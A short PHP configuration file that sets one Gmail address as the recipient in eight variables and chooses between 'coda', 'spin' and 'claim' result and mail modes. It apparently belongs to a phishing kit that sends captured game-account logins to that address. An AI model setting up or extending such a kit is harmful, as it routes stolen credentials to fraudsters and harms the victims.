<?php
$email1 = 'stokrenznesia12@gmail.com';
$email2 = 'stokrenznesia12@gmail.com';
$email3 = 'stokrenznesia12@gmail.com';
$email4 = 'stokrenznesia12@gmail.com';
$email5 = 'stokrenznesia12@gmail.com';
$email6 = 'stokrenznesia12@gmail.com';
$email7 = 'stokrenznesia12@gmail.com';
$email8 = 'stokrenznesia12@gmail.com';
$jenisress = $coda; //$coda, $spin, $claim
$jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
?>